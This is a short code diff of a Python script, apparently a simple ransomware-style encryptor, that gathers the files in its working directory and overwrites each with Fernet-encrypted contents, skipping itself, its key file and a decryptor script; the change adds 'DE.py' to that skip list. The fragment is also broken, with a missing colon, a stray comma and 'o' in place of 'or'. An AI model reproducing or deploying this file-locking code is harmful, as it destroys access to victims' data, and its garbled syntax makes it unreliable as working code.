@@ -7,7 +7,7 @@ from cryptography.fernet import Fernet
 files = []
 
 for file in os.listdir()
-	if file == "EN.py", or file == "thekey.key":
+	if file == "EN.py", or file == "thekey.key", o file == "DE.py":
 		continue
 	if os.path.isfile(file):
 		files.append(file)
@@ -26,3 +26,4 @@ for file in files:
 	contents_encrypted = Fernet(key).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
+
